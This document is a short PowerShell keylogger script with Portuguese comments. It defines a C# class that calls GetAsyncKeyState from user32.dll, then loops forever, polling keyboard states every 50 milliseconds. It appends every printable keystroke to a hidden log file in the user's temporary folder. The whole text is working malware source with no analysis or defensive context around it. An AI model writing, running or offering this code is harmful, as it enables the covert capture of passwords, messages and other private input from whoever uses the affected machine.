# Caminho do arquivo onde será salvo o log
$keylogPath = "$env:TEMP\keylog.txt"

# Garante que o arquivo exista e esteja limpo
"" | Out-File -Encoding utf8 $keylogPath

# Função para capturar teclas
Add-Type -AssemblyName WindowsBase
Add-Type -AssemblyName PresentationCore
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class KeyboardListener {
    [DllImport("user32.dll")]
    public static extern short GetAsyncKeyState(int vKey);
}
"@

# Loop infinito para escutar teclas pressionadas
while ($true) {
    Start-Sleep -Milliseconds 50
    foreach ($ascii in 1..254) {
        $state = [KeyboardListener]::GetAsyncKeyState($ascii)
        if ($state -eq -32767) {
            $char = [char]$ascii
            # Apenas letras, números, símbolos visíveis
            if ($char -match '\w|\p{P}|\s') {
                [IO.File]::AppendAllText($keylogPath, $char)
            }
        }
    }
}
